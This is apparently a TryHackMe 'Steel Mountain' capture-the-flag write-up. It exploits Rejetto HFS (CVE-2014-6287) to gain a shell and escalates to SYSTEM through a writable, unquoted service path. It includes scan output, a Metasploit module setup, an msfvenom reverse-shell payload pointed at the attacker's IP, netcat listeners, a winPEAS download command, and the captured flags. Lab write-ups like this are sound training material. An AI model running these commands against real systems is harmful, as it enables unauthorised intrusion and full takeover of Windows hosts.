> Steel Mountain | Windows | Powershell | Metasploit

1. Who is the employee of the month?

`Bill Harper` => We can view image info and get the answer!💚

# Rustscan

sudo rustscan -a $IP --ulimit=5000 --batch-size=4500 -- -sC -sV -Pn -A -O | tee rustscan.log


```
80/tcp  open  http        syn-ack ttl 127 Microsoft IIS httpd 8.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Site doesn't have a title (text/html).
135/tcp open  msrpc       syn-ack ttl 127 Microsoft Windows RPC
139/tcp open  netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server? syn-ack
| ssl-cert: Subject: commonName=steelmountain
| Issuer: commonName=steelmountain
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2021-04-25T16:00:36
| Not valid after:  2021-10-25T16:00:36
| MD5:   c647 9329 90e8 ecf6 0146 3146 44ed bf20
| SHA-1: 7af3 51a3 8317 f1c7 a5ca da58 45b7 20ac 78dc f224
| -----BEGIN CERTIFICATE-----
| MIIC3jCCAcagAwIBAgIQF70tevLduIRG8EQ77avIbzANBgkqhkiG9w0BAQUFADAY
| MRYwFAYDVQQDEw1zdGVlbG1vdW50YWluMB4XDTIxMDQyNTE2MDAzNloXDTIxMTAy
| NTE2MDAzNlowGDEWMBQGA1UEAxMNc3RlZWxtb3VudGFpbjCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBAKl8y8xUhyr4owGoMQkM+U4VTOZgvWNveUjxEOKO
| HGzKjBYp41ftLxN5hbB6KL4PXNPKr2NftS62Bv9avdxfsxVIIN/Kn9YrmGLCBwbj
| SLBcQcGCp3CAzeLfEUPKjBR6AfgImPYwZSJoOTEVR3goI4PrEp37Etb/lUEOoBgX
| LHB0Jw7Ji3DL6sSgDF3qMlasAd7yfTO8C59Lf5ulyV0KDuxY0sINSY4pU4aQu9ey
| LZMrxW7jyG7XmBolMprWGgDb7ZK3NtexE3YotxbRHC/42KchoVI1dkMK71ZmCdLv
| xHsv66GVUtv4eTa7xMzVsZU13PloKMohtrZsV/AJIx11U8ECAwEAAaMkMCIwEwYD
| VR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBBQUAA4IB
| AQBiH+4mQWenjZ4f3v2pxB4raDLBxlZu3p+U+UNLDCQ1KpKBt6RM4K6c88Y6z5EZ
| lpVtB01d50RiqXK8j9mgKdfMJ3H1+XAA1BjG2mdJQrna2EbOy3Vl5EIkKf8qNM+f
| eGU/hKzxJwPD5UfNaXdYr8npjwEF/IKHe2gFfm8zaRVzO9IFu5Yd8L3pVn5cF7El
| It/HX1D2mF5MVskoYE62y3ZTW3C3OI4kQqSnk0+4TfRZZBnSdjq8iTX+MMpvLLeU
| RxSpPJHT8bBErvcj9vLqCGys3Qki3ISTTP/Dz8NZB13Px0xFwmq9CmSQToBOYOvg
| UdotVxx1zjINIAuOm0p+Noj5
|_-----END CERTIFICATE-----
|_ssl-date: 2021-04-26T16:06:05+00:00; 0s from scanner time.
8080/tcp  open  http               syn-ack HttpFileServer httpd 2.3
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: HFS 2.3
|_http-title: HFS /
49152/tcp open  msrpc              syn-ack Microsoft Windows RPC
49153/tcp open  msrpc              syn-ack Microsoft Windows RPC
49154/tcp open  msrpc              syn-ack Microsoft Windows RPC
49155/tcp open  msrpc              syn-ack Microsoft Windows RPC
49156/tcp open  msrpc              syn-ack Microsoft Windows RPC
49163/tcp open  msrpc              syn-ack Microsoft Windows RPC
```

Looks like port 8080 rund `Rejetto HTTP File Server` and has many exploits and looks like the first one is `CVE-2014-6287`. Also we have an exploit in metasploit. Looks like RCE exploit. I chose doing it with Exploit-DB style👷.

Downloaded the file. Setup a server on port 80 to pass `nc.exe` to the machine. And run exploit 1'st time to transfer `nc.exe`. Again starting a listener in our machine we can run the exploit again to get a shell!!

# Steps 

1. (local) sudo python3 -m http.server 80 => Must have nc.exe
2. (local) python exploit.py robots.thm 8080
3. (local) sudo nc -lnvp 443
4. (local) python exploit.py robots.thm 8080 => We got a shell!🎉🎉🎉🎉🎉

# user.txt

```
b04763b6fcf51fcd7c13abc7db4fd365	
```

(OR)

# Metasploit

windows/http/rejetto_hfs_exec

```
set LHOST 10.8.107.21
set RPORT 8080
set RHOSTS 10.10.80.173
run
```

We have a meterpreter session available.

# Privilege Escalation

Let's enumerate the machine using a powershell script called `PowerUp`. Let's upload it to the meterpreter session.

## Steps

1. upload /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1
2. load powershell
3. powershell_shell => To get a powershell session
4. (PS) . .\PowerUp.ps1
5. (PS) Invoke-AllChecks

## Invoke-AllChecks

```
[*] Running Invoke-AllChecks


[*] Checking if user is in a local group with administrative privileges...


[*] Checking for unquoted service paths...


ServiceName   : AdvancedSystemCareService9
Path          : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'AdvancedSystemCareService9' -Path <HijackPath>

ServiceName   : AWSLiteAgent
Path          : C:\Program Files\Amazon\XenTools\LiteAgent.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'AWSLiteAgent' -Path <HijackPath>

ServiceName   : IObitUnSvr
Path          : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'IObitUnSvr' -Path <HijackPath>

ServiceName   : LiveUpdateSvc
Path          : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'LiveUpdateSvc' -Path <HijackPath>





[*] Checking service executable and argument permissions...


ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiableFile : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
StartName      : LocalSystem
AbuseFunction  : Install-ServiceBinary -ServiceName 'IObitUnSvr'





[*] Checking service permissions...


[*] Checking %PATH% for potentially hijackable .dll locations...


HijackablePath : C:\Windows\system32\
AbuseFunction  : Write-HijackDll -OutputFile 'C:\Windows\system32\\wlbsctrl.dll' -Command '...'

HijackablePath : C:\Windows\
AbuseFunction  : Write-HijackDll -OutputFile 'C:\Windows\\wlbsctrl.dll' -Command '...'

HijackablePath : C:\Windows\System32\WindowsPowerShell\v1.0\
AbuseFunction  : Write-HijackDll -OutputFile 'C:\Windows\System32\WindowsPowerShell\v1.0\\wlbsctrl.dll' -Command '...'
```

# Msfvenom

Let's craft a msfvenom payload to abuse weak file permissions on service files.

`msfvenom -p windows/shell_reverse_tcp LHOST=10.8.107.21 LPORT=12345 -e x86/shikata_ga_nai -f exe -o Advanced.exe`

Let's place it in `C:\Program Files (x86)\IObit`. 

## Steps

1. (meterpreter) upload /home/n00bmast3r/TryHackMe/Steel_Mountain/Advanced.
2. (meterpreter) shell
3. (shell) sc stop AdvancedSystemCareService9
4. (shell) sc start AdvancedSystemCareService9

We have a shell now as System32.🔥

# root.txt

```
9af5f314f57607c00fd09803a587db80
```

# Manual Enumeration

## Steps

1. powershell -c wget "http://10.8.107.21/winPEASx64.exe" -outfile "winPEAS.exe"

There are many results but we are looking for Unquoted Path Service.

```
    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\{10921475-03CE-4E04-90CE-E2E7EF20C814}
    Folder: C:\Program Files (x86)\IObit\IObit Uninstaller
    FolderPerms: bill [WriteData/CreateFiles]
    File: C:\Program Files (x86)\IObit\IObit Uninstaller\UninstallExplorer.dll (Unquoted and Space detected)
    FilePerms: bill [WriteData/CreateFiles]
```

Or we can use this to get the same

`wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "C:\windows\\" |findstr /i /v """`

Let's check the privileges🚨

sc qc AdvancedSystemCareService9 

```
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: AdvancedSystemCareService9
        TYPE               : 110  WIN32_OWN_PROCESS (interactive)
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
        LOAD_ORDER_GROUP   : System Reserved
        TAG                : 1
        DISPLAY_NAME       : Advanced SystemCare Service 9
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

icalcs "Advanced SystemCare"

Looks like we have write and execute permissions. And other steps are same as in metsaploit!